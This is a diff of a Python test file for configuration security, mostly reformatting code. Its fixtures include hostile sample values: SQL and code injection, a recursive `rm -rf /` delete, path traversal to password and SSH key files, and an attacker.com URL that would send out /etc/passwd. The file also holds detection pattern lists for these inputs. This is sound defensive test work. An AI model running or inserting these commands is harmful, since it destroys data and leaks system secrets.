@@ -15,16 +15,17 @@ import os
 import tempfile
 import yaml
 from pathlib import Path
-from unittest.mock import patch, MagicMock, mock_open
-from typing import Dict, Any, List, Optional
+from unittest.mock import patch
+from typing import Dict, Any, List
 
 import sys
+
 sys.path.insert(0, "src")
 
 
 class TestConfigurationIntegrityRegression:
     """Regression tests for configuration integrity and security."""
-    
+
     @pytest.fixture
     def temp_config_dir(self):
         """Create temporary config directory for testing."""
@@ -32,11 +33,12 @@ class TestConfigurationIntegrityRegression:
         config_dir = temp_dir / "config"
         config_dir.mkdir()
         yield config_dir
-        
+
         # Cleanup
         import shutil
+
         shutil.rmtree(temp_dir, ignore_errors=True)
-    
+
     def test_config_files_never_contain_secrets(self, temp_config_dir):
         """CRITICAL: Configuration files must never contain plaintext secrets."""
         # Create test configuration files
@@ -46,191 +48,184 @@ class TestConfigurationIntegrityRegression:
                 "port": 5432,
                 "database": "aivillage",
                 "password": "PLACEHOLDER_DB_PASSWORD",  # Should be placeholder
-                "ssl_cert_path": "/path/to/cert"
+                "ssl_cert_path": "/path/to/cert",
             },
             "redis.yaml": {
-                "host": "localhost", 
+                "host": "localhost",
                 "port": 6379,
                 "password": "${REDIS_PASSWORD}",  # Should use env var
-                "ssl": True
+                "ssl": True,
             },
             "api_keys.json": {
                 "openai_api_key": "${OPENAI_API_KEY}",  # Should use env var
-                "anthropic_key": "PLACEHOLDER_ANTHROPIC_KEY"  # Should be placeholder
-            }
+                "anthropic_key": "PLACEHOLDER_ANTHROPIC_KEY",  # Should be placeholder
+            },
         }
-        
+
         for filename, content in configs.items():
             config_path = temp_config_dir / filename
-            if filename.endswith('.json'):
-                with open(config_path, 'w') as f:
+            if filename.endswith(".json"):
+                with open(config_path, "w") as f:
                     json.dump(content, f, indent=2)
             else:
-                with open(config_path, 'w') as f:
+                with open(config_path, "w") as f:
                     yaml.dump(content, f)
-        
+
         # Check for secrets in config files
         dangerous_patterns = [
-            r'sk-[a-zA-Z0-9]{48}',  # OpenAI API key pattern
-            r'[A-Za-z0-9]{32,}',    # Long random strings (potential secrets)
-            r'password.*[:=].*[^$\{].*[a-zA-Z0-9]{8,}',  # Actual passwords not env vars
-            r'secret.*[:=].*[^$\{].*[a-zA-Z0-9]{8,}',    # Secrets not env vars
+            r"sk-[a-zA-Z0-9]{48}",  # OpenAI API key pattern
+            r"[A-Za-z0-9]{32,}",  # Long random strings (potential secrets)
+            r"password.*[:=].*[^$\{].*[a-zA-Z0-9]{8,}",  # Actual passwords not env vars
+            r"secret.*[:=].*[^$\{].*[a-zA-Z0-9]{8,}",  # Secrets not env vars
         ]
-        
+
         for config_file in temp_config_dir.glob("*"):
             content = config_file.read_text()
-            
+
             # Check for dangerous patterns
             import re
+
             for pattern in dangerous_patterns:
                 matches = re.findall(pattern, content, re.IGNORECASE)
                 if matches:
                     # Allow known safe patterns
-                    safe_matches = [m for m in matches if any(safe in m.upper() 
-                                  for safe in ["PLACEHOLDER", "EXAMPLE", "TEST"])]
+                    safe_matches = [
+                        m for m in matches if any(safe in m.upper() for safe in ["PLACEHOLDER", "EXAMPLE", "TEST"])
+                    ]
                     dangerous_matches = [m for m in matches if m not in safe_matches]
-                    
-                    assert not dangerous_matches, \
-                        f"Potential secrets found in {config_file.name}: {dangerous_matches}"
-    
+
+                    assert not dangerous_matches, f"Potential secrets found in {config_file.name}: {dangerous_matches}"
+
     def test_environment_specific_config_isolation(self, temp_config_dir):
         """Test configuration properly isolates environments."""
         # Create environment-specific configs
         environments = ["development", "staging", "production"]
-        
+
         for env in environments:
             env_dir = temp_config_dir / env
             env_dir.mkdir()
-            
+
             config = {
                 "environment": env,
                 "debug": env == "development",
                 "allowed_origins": self._get_env_cors_origins(env),
                 "database_pool_size": self._get_env_db_pool_size(env),
-                "log_level": self._get_env_log_level(env)
+                "log_level": self._get_env_log_level(env),
             }
-            
+
             config_path = env_dir / "app_config.json"
-            with open(config_path, 'w') as f:
+            with open(config_path, "w") as f:
                 json.dump(config, f, indent=2)
-        
+
         # Validate environment isolation
         for env in environments:
             config_path = temp_config_dir / env / "app_config.json"
-            with open(config_path, 'r') as f:
+            with open(config_path, "r") as f:
                 config = json.load(f)
-            
+
             if env == "production":
                 # Production should be most restrictive
                 assert config["debug"] is False, "Debug enabled in production"
                 assert len(config["allowed_origins"]) <= 3, "Too many CORS origins in production"
-                assert all(o.startswith("https://") for o in config["allowed_origins"]), \
-                    "Non-HTTPS origins in production"
+                assert all(
+                    o.startswith("https://") for o in config["allowed_origins"]
+                ), "Non-HTTPS origins in production"
                 assert config["log_level"] in ["WARNING", "ERROR"], "Verbose logging in production"
-                
+
             elif env == "development":
                 # Development can be more permissive
                 assert config["debug"] is True, "Debug disabled in development"
-                assert "localhost" in str(config["allowed_origins"]), \
-                    "Localhost not allowed in development"
-                
+                assert "localhost" in str(config["allowed_origins"]), "Localhost not allowed in development"
+
             # All environments should have proper structure
             assert config["environment"] == env, f"Environment mismatch in {env} config"
-            assert isinstance(config["database_pool_size"], int), \
-                f"Invalid DB pool size type in {env}"
+            assert isinstance(config["database_pool_size"], int), f"Invalid DB pool size type in {env}"
             assert config["database_pool_size"] > 0, f"Invalid DB pool size in {env}"
-    
+
     def test_config_validation_prevents_injection(self, temp_config_dir):
         """Test configuration validation prevents injection attacks."""
         malicious_configs = [
             # JSON injection
             {
-                "name": "test\"; DROP TABLE users; --",
+                "name": 'test"; DROP TABLE users; --',
                 "command": "eval(__import__('os').system('rm -rf /'))",
-                "script": "<script>alert('xss')</script>"
+                "script": "<script>alert('xss')</script>",
             },
             # Path traversal
-            {
-                "log_file": "../../../etc/passwd",
-                "cert_path": "../../../../root/.ssh/id_rsa",
-                "data_dir": "/etc/shadow"
-            },
+            {"log_file": "../../../etc/passwd", "cert_path": "../../../../root/.ssh/id_rsa", "data_dir": "/etc/shadow"},
             # Command injection
             {
                 "backup_command": "mysqldump db; rm -rf /",
-                "notification_url": "http://attacker.com/steal?data=`cat /etc/passwd`"
-            }
+                "notification_url": "http://attacker.com/steal?data=`cat /etc/passwd`",
+            },
         ]
-        
+
         for i, malicious_config in enumerate(malicious_configs):
             config_path = temp_config_dir / f"malicious_{i}.json"
-            with open(config_path, 'w') as f:
+            with open(config_path, "w") as f:
                 json.dump(malicious_config, f)
-            
+
             # Configuration validation should catch these
             validation_result = self._validate_config_security(config_path)
-            assert not validation_result["is_safe"], \
-                f"Malicious config {i} passed validation: {malicious_config}"
-            assert len(validation_result["violations"]) > 0, \
-                f"No violations detected for malicious config {i}"
-    
+            assert not validation_result["is_safe"], f"Malicious config {i} passed validation: {malicious_config}"
+            assert len(validation_result["violations"]) > 0, f"No violations detected for malicious config {i}"
+
     def test_config_file_permissions_security(self, temp_config_dir):
         """Test configuration files have secure permissions."""
         # Create config file
         config_path = temp_config_dir / "secure_config.json"
         config = {"api_key": "${API_KEY}", "secret": "${SECRET_KEY}"}
-        
-        with open(config_path, 'w') as f:
+
+        with open(config_path, "w") as f:
             json.dump(config, f)
-        
+
         # Check file permissions (on Unix-like systems)
         import stat
+
         file_stat = config_path.stat()
         file_mode = stat.filemode(file_stat.st_mode)
-        
+
         # Config files should not be world-readable
-        assert not (file_stat.st_mode & stat.S_IROTH), \
-            f"Config file is world-readable: {file_mode}"
-        assert not (file_stat.st_mode & stat.S_IWOTH), \
-            f"Config file is world-writable: {file_mode}"
-        
+        assert not (file_stat.st_mode & stat.S_IROTH), f"Config file is world-readable: {file_mode}"
+        assert not (file_stat.st_mode & stat.S_IWOTH), f"Config file is world-writable: {file_mode}"
+
         # Should be readable by owner and group only
-        expected_perms = stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP
+        stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP
         actual_perms = file_stat.st_mode & 0o777
-        
+
         # Allow some flexibility in permissions but ensure not world-accessible
         assert not (actual_perms & 0o007), "Config file has world permissions"
-    
+
     def test_config_loading_handles_corruption_gracefully(self, temp_config_dir):
         """Test configuration loading handles corrupted files gracefully."""
         corrupted_configs = [
             # Malformed JSON
             '{"key": "value", "incomplete": }',
             # Invalid YAML
-            'key: value\n  invalid: yaml: structure:',
+            "key: value\n  invalid: yaml: structure:",
             # Binary data
-            b'\x00\x01\x02\x03\x04\x05',
+            b"\x00\x01\x02\x03\x04\x05",
             # Empty file
-            '',
+            "",
             # Very large file (potential DoS)
-            '{"data": "' + 'x' * 10000 + '"}',
+            '{"data": "' + "x" * 10000 + '"}',
         ]
-        
+
         for i, corrupt_content in enumerate(corrupted_configs):
             config_path = temp_config_dir / f"corrupt_{i}.json"
-            
+
             if isinstance(corrupt_content, bytes):
                 config_path.write_bytes(corrupt_content)
             else:
                 config_path.write_text(corrupt_content)
-            
+
             # Config loading should handle corruption gracefully
             result = self._safe_load_config(config_path)
-            
+
             assert result["success"] is False, f"Corrupted config {i} loaded successfully"
             assert "error" in result, f"No error reported for corrupted config {i}"
             assert result["config"] is None, f"Config data returned for corrupted file {i}"
-    
+
     def test_config_environment_variable_substitution_security(self, temp_config_dir):
         """Test environment variable substitution is secure."""
         # Create config with environment variables
@@ -238,45 +233,45 @@ class TestConfigurationIntegrityRegression:
             "database": {
                 "password": "${DB_PASSWORD}",
                 "host": "${DB_HOST:-localhost}",  # With default
-                "port": "${DB_PORT:-5432}"
+                "port": "${DB_PORT:-5432}",
             },
-            "api": {
-                "key": "${API_KEY}",
-                "url": "${API_URL}"
-            },
+            "api": {"key": "${API_KEY}", "url": "${API_URL}"},
             # Potential injection attempts
             "malicious": {
                 "command": "${$(rm -rf /)}",  # Command substitution attempt
                 "path": "${PWD}/../../../etc/passwd",  # Path traversal attempt
-                "eval": "${`eval dangerous_code`}"  # Eval attempt
-            }
+                "eval": "${`eval dangerous_code`}",  # Eval attempt
+            },
         }
-        
+
         config_path = temp_config_dir / "env_config.json"
-        with open(config_path, 'w') as f:
+        with open(config_path, "w") as f:
             json.dump(config, f, indent=2)
-        
+
         # Set safe environment variables
-        with patch.dict(os.environ, {
-            'DB_PASSWORD': 'safe_password',
-            'DB_HOST': 'safe_host',
-            'API_KEY': 'safe_key',
-            'API_URL': 'https://safe-api.com'
-        }):
+        with patch.dict(
+            os.environ,
+            {
+                "DB_PASSWORD": "safe_password",
+                "DB_HOST": "safe_host",
+                "API_KEY": "safe_key",
+                "API_URL": "https://safe-api.com",
+            },
+        ):
             substituted_config = self._substitute_env_vars(config)
-            
+
             # Safe substitutions should work
             assert substituted_config["database"]["password"] == "safe_password"
             assert substituted_config["database"]["host"] == "safe_host"
             assert substituted_config["api"]["key"] == "safe_key"
-            
+
             # Malicious patterns should be blocked or sanitized
             malicious_section = substituted_config.get("malicious", {})
             for key, value in malicious_section.items():
-                assert not any(dangerous in str(value) for dangerous in 
-                             ["rm -rf", "eval", "../../../"]), \
-                    f"Dangerous content in {key}: {value}"
-    
+                assert not any(
+                    dangerous in str(value) for dangerous in ["rm -rf", "eval", "../../../"]
+                ), f"Dangerous content in {key}: {value}"
+
     def _get_env_cors_origins(self, env: str) -> List[str]:
         """Get CORS origins for environment."""
         if env == "production":
@@ -285,7 +280,7 @@ class TestConfigurationIntegrityRegression:
             return ["https://staging.aivillage.app", "http://localhost:3000"]
         else:  # development
             return ["http://localhost:3000", "http://localhost:8080", "http://127.0.0.1:3000"]
-    
+
     def _get_env_db_pool_size(self, env: str) -> int:
         """Get database pool size for environment."""
         if env == "production":
@@ -294,7 +289,7 @@ class TestConfigurationIntegrityRegression:
             return 10
         else:  # development
             return 5
-    
+
     def _get_env_log_level(self, env: str) -> str:
         """Get log level for environment."""
         if env == "production":
@@ -303,17 +298,17 @@ class TestConfigurationIntegrityRegression:
             return "INFO"
         else:  # development
             return "DEBUG"
-    
+
     def _validate_config_security(self, config_path: Path) -> Dict[str, Any]:
         """Validate configuration for security issues."""
         try:
-            with open(config_path, 'r') as f:
+            with open(config_path, "r") as f:
                 config = json.load(f)
         except:
             return {"is_safe": False, "violations": ["Invalid JSON format"]}
-        
+
         violations = []
-        
+
         # Check for dangerous patterns
         config_str = json.dumps(config).lower()
         dangerous_patterns = [
@@ -322,84 +317,68 @@ class TestConfigurationIntegrityRegression:
             ("<script>", "XSS attempt"),
             ("eval(", "Code injection"),
             ("../../../", "Path traversal"),
-            ("system(", "System command execution")
+            ("system(", "System command execution"),
         ]
-        
+
         for pattern, description in dangerous_patterns:
             if pattern.lower() in config_str:
                 violations.append(f"{description}: {pattern}")
-        
+
         # Check for absolute paths to sensitive files
         sensitive_files = ["/etc/passwd", "/etc/shadow", "/root/", "id_rsa"]
         for sensitive in sensitive_files:
             if sensitive in config_str:
                 violations.append(f"Reference to sensitive file: {sensitive}")
-        
-        return {
-            "is_safe": len(violations) == 0,
-            "violations": violations,
-            "config": config
-        }
-    
+
+        return {"is_safe": len(violations) == 0, "violations": violations, "config": config}
+
     def _safe_load_config(self, config_path: Path) -> Dict[str, Any]:
         """Safely load configuration file."""
         try:
             # Check file size (prevent DoS)
             if config_path.stat().st_size > 1024 * 1024:  # 1MB limit
-                return {
-                    "success": False,
-                    "error": "Configuration file too large",
-                    "config": None
-                }
-            
-            with open(config_path, 'r') as f:
+                return {"success": False, "error": "Configuration file too large", "config": None}
+
+            with open(config_path, "r") as f:
                 content = f.read()
-                
+
             # Try to parse as JSON
             try:
                 config = json.loads(content)
                 return {"success": True, "config": config, "error": None}
             except json.JSONDecodeError as e:
-                return {
-                    "success": False,
-                    "error": f"JSON parsing error: {e}",
-                    "config": None
-                }
-                
+                return {"success": False, "error": f"JSON parsing error: {e}", "config": None}
+
         except Exception as e:
-            return {
-                "success": False,
-                "error": f"File loading error: {e}",
-                "config": None
-            }
-    
+            return {"success": False, "error": f"File loading error: {e}", "config": None}
+
     def _substitute_env_vars(self, config: Dict[str, Any]) -> Dict[str, Any]:
         """Safely substitute environment variables in config."""
         import re
-        
+
         def substitute_value(value):
             if not isinstance(value, str):
                 return value
-            
+
             # Simple pattern for ${VAR} or ${VAR:-default}
-            pattern = r'\$\{([^}]+)\}'
-            
+            pattern = r"\$\{([^}]+)\}"
+
             def replace_env_var(match):
                 var_expr = match.group(1)
-                
+
                 # Check for dangerous patterns
-                if any(dangerous in var_expr for dangerous in ['$(', '`', 'eval', '../']):
+                if any(dangerous in var_expr for dangerous in ["$(", "`", "eval", "../"]):
                     return f"BLOCKED_DANGEROUS_PATTERN_{var_expr}"
-                
+
                 # Handle default values
-                if ':-' in var_expr:
-                    var_name, default = var_expr.split(':-', 1)
+                if ":-" in var_expr:
+                    var_name, default = var_expr.split(":-", 1)
                     return os.environ.get(var_name, default)
                 else:
                     return os.environ.get(var_expr, f"UNDEFINED_{var_expr}")
-            
+
             return re.sub(pattern, replace_env_var, value)
-        
+
         def process_dict(d):
             result = {}
             for key, value in d.items():
@@ -410,13 +389,13 @@ class TestConfigurationIntegrityRegression:
                 else:
                     result[key] = substitute_value(value)
             return result
-        
+
         return process_dict(config)
 
 
 class TestConfigurationBehavioralContracts:
     """Behavioral contract tests for configuration management."""
-    
+
     def test_config_loading_contract(self):
         """Contract: Configuration loading always returns consistent structure."""
         # Test various file types and states
@@ -426,103 +405,101 @@ class TestConfigurationBehavioralContracts:
             ("invalid.json", '{"key": }', False),
             ("nonexistent.json", None, False),
         ]
-        
+
         for filename, content, should_succeed in test_cases:
-            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
+            with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".json") as f:
                 if content is not None:
                     f.write(content)
                 temp_path = Path(f.name)
-            
+
             try:
                 if content is None:
                     temp_path.unlink()  # Remove file to test nonexistent case
-                
+
                 # This would be your actual config loading function
                 result = self._mock_load_config(temp_path)
-                
+
                 # Contract: Always returns dict with required fields
                 assert isinstance(result, dict), f"Non-dict result for {filename}"
                 assert "success" in result, f"Missing 'success' field for {filename}"
-                assert "error" in result or result["success"], \
-                    f"Missing 'error' field for failed load of {filename}"
-                
+                assert "error" in result or result["success"], f"Missing 'error' field for failed load of {filename}"
+
                 if should_succeed:
                     assert result["success"], f"Should succeed for {filename}"
                     assert "config" in result, f"Missing 'config' for successful {filename}"
                 else:
                     assert not result["success"], f"Should fail for {filename}"
-                    
+
             finally:
                 if temp_path.exists():
                     temp_path.unlink()
-    
+
     def test_environment_isolation_contract(self):
         """Contract: Environment configurations never leak between environments."""
         environments = ["development", "staging", "production"]
-        
+
         # Simulate environment-specific configs
         env_configs = {}
         for env in environments:
             env_configs[env] = {
                 "environment": env,
                 "debug": env == "development",
-                "cors_origins": self._get_cors_for_env(env)
+                "cors_origins": self._get_cors_for_env(env),
             }
-        
+
         # Test isolation
         for env in environments:
             config = env_configs[env]
-            
+
             # Production should never have debug enabled
             if env == "production":
                 assert config["debug"] is False, "Debug leaked into production"
-                
+
             # Development should never have production domains
             if env == "development":
                 origins = config["cors_origins"]
                 production_domains = ["aivillage.app", "api.aivillage.app"]
-                
+
                 for domain in production_domains:
-                    assert not any(domain in origin for origin in origins), \
-                        f"Production domain {domain} leaked into development"
-    
+                    assert not any(
+                        domain in origin for origin in origins
+                    ), f"Production domain {domain} leaked into development"
+
     def test_secret_handling_contract(self):
         """Contract: Secrets are never stored in plaintext configuration."""
         config_samples = [
             {"api_key": "${API_KEY}"},  # Environment variable - OK
-            {"password": "PLACEHOLDER_PASSWORD"},  # Placeholder - OK  
+            {"password": "PLACEHOLDER_PASSWORD"},  # Placeholder - OK
             {"secret": "actual_secret_123"},  # Actual secret - BAD
             {"token": "sk-1234567890abcdef"},  # API key pattern - BAD
         ]
-        
+
         for i, config in enumerate(config_samples):
             security_check = self._check_config_secrets(config)
-            
+
             if i < 2:  # First two should pass
-                assert security_check["is_safe"], \
-                    f"Safe config {i} failed security check: {config}"
+                assert security_check["is_safe"], f"Safe config {i} failed security check: {config}"
             else:  # Last two should fail
-                assert not security_check["is_safe"], \
-                    f"Unsafe config {i} passed security check: {config}"
-    
+                assert not security_check["is_safe"], f"Unsafe config {i} passed security check: {config}"
+
     def _mock_load_config(self, path: Path) -> Dict[str, Any]:
         """Mock configuration loading function."""
         try:
             if not path.exists():
                 return {"success": False, "error": "File not found"}
-            
+
             content = path.read_text()
             if not content.strip():
                 return {"success": False, "error": "Empty file"}
-            
+
             config = json.loads(content)
             return {"success": True, "config": config}
-            
+
         except json.JSONDecodeError as e:
             return {"success": False, "error": f"JSON error: {e}"}
         except Exception as e:
             return {"success": False, "error": f"Loading error: {e}"}
-    
+
     def _get_cors_for_env(self, env: str) -> List[str]:
         """Get CORS origins for environment."""
         if env == "production":
@@ -531,29 +508,25 @@ class TestConfigurationBehavioralContracts:
             return ["https://staging.aivillage.app", "http://localhost:3000"]
         else:
             return ["http://localhost:3000", "http://127.0.0.1:3000"]
-    
+
     def _check_config_secrets(self, config: Dict[str, Any]) -> Dict[str, Any]:
         """Check configuration for secrets."""
         import re
-        
+
         config_str = json.dumps(config)
         violations = []
-        
+
         # Patterns that indicate actual secrets (not placeholders/env vars)
         secret_patterns = [
-            (r'sk-[a-zA-Z0-9]{48}', "OpenAI API key pattern"),
+            (r"sk-[a-zA-Z0-9]{48}", "OpenAI API key pattern"),
             (r'"[a-zA-Z0-9]{32,}"', "Long random string (potential secret)"),
-            (r'actual_secret', "Literal secret text"),
+            (r"actual_secret", "Literal secret text"),
         ]
-        
+
         for pattern, description in secret_patterns:
             if re.search(pattern, config_str):
                 # Check if it's a placeholder or env var
-                if not any(safe in config_str.upper() for safe in 
-                         ["${", "PLACEHOLDER", "EXAMPLE", "TEST"]):
+                if not any(safe in config_str.upper() for safe in ["${", "PLACEHOLDER", "EXAMPLE", "TEST"]):
                     violations.append(description)
-        
-        return {
-            "is_safe": len(violations) == 0,
-            "violations": violations
-        }
+
+        return {"is_safe": len(violations) == 0, "violations": violations}
